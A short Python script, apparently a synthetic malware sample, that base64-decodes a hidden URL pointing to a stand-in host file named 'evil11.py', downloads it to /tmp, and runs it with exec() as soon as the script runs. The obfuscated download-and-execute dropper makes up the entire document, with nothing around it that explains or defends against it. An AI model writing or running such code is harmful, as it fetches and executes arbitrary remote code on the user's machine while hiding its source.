import urllib.request
import base64

def retrieveUrl(x):
    return base64.b64decode(x).decode("utf-8")

def downloadScript(y, z):
    urllib.request.urlretrieve(y, z)

def executeScript(z):
    with open(z, "r") as f:
        w = f.read()
    exec(w)

def main():
    try:
        x = "aHR0cDovL3NhbXBsZS51cmwvZXZpbDExLnB5"
        y = retrieveUrl(x)
        z = "/tmp/execute.rb"
        downloadScript(y, z)
        executeScript(z)
    except Exception as e:
        print(e)

main()
